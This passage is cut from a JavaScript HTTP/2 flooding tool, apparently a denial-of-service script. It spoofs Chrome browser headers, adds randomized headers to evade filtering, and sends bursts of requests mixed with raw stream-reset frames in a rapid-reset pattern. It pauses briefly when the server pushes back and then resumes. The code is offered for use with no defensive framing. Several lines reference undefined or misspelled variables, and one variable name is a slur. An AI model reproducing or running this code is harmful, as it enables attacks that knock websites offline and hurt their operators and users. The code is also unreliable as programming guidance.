                        updatedHeaders["accept-encoding"] = `${randomString}`;
                        break;
                    case 12:
                        updatedHeaders["sec-ch-ua"] = `"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"`;
                        updatedHeaders["sec-ch-ua-mobile"] = "?0";
                        updatedHeaders["sec-ch-ua-platform"] = `"Windows"`;
                        updatedHeaders["upgrade-insecure-requests"] = "1";
                        updatedHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                        updatedHeaders["sec-fetch-site"] = "none";
                        updatedHeaders["sec-fetch-mode"] = "navigate";
                        updatedHeaders["sec-fetch-user"] = "?1";
                        updatedHeaders["sec-fetch-dest"] = "document";
                        updatedHeaders["accept-encoding"] = "gzip, deflate, br, zstd";
                        break;
                    default:
                        break;
                }
            
                return updatedHeaders;
            };
            
            if (streamId >= Math.floor(rps / 2)) {
                let updatedHeaders = headers2(currenthead);
                
                Object.entries(updatedHeaders).forEach(([key, value]) => {
                    if (!headers.some(h => h[0] === key.trim())) {
                        headers.push([key.trim(), value.trim()]);
                    }
                 });
            }
            const updatedHeaders = headers2(currenthead);
                let gay = shuffleObject({
                    ...taoDoiTuongNgauNhien(),
                    ...taoDoiTuongNgauNhien(),
                });
                const head = {
                    ...headers,
                    ...gay,
                    ...dynHeaders,
                    ...updatedHeaders,
                };
                
                            
                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
                for (let i = 0; i < rps; i++) {
                 const priorityWeight = Math.floor(Math.random() * 256); 
                const requestPromise = new Promise((resolve, reject) => {
                    const request = client.request(head, {
                                                weight: priorityWeight,
                                                parent:0,
                                                exclusive: true,
						                        endStream: true,
                                                dependsOn: 0,
                                               
                                            });
                                            req.setEncoding('utf8');
                                            let data = 0;
                                            req.on('data', (chunk) => {
                                            data += chunk;
                                            });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve(data);
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                            tlsSocket.write(Buffer.concat([
                                                encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                                                frame
                                                
                                                
                                            ]));
                                        } else if (streamIdReset >= 2 && (streamIdReset -2) % 4 === 0) {
                       tlsSocket.write(Buffer.concat([encodeFrame(streamId, data, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),frames
                            
                                        ]));
                            } 
                                        streamIdReset+= 2;
                                        streamId += 2;
                                        data +=2;
                requests.push({ requestPromise, frame });
                
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
            const requestPromise2 = new Promise((resolve, reject) => {
                const request2 = client.request(head, {
                    priority: 1,
                    weight: priorityWeight,
                    parent: 0,
                    exclusive: true,
                });
                request2.setEncoding('utf8');
                let data2 = Buffer.alloc(0);

                request2.on('data', (chunk) => {
                    data2 += chunk;
                });

                request2.on('response', (res2) => {
                    request2.close(http2.constants.NO_ERROR);
                        request2.destroy();
                    resolve(data2);
                });

                request2.on('end', () => {
                    count++;
                    if (count === args.time * args.Rate) {
                        clearInterval(intervalId);
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
                    } else if (count === args.Rate) {
                        client.close(http2.constants.NGHTTP2_CANCEL);
                        client.destroy();
                        clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                });

                request2.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
            });

            requests1.push({ requestPromise: requestPromise2, frame });
            await Promise.all(requests1.map(({ requestPromise }) => requestPromise));
           
        }, 500);
    });
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
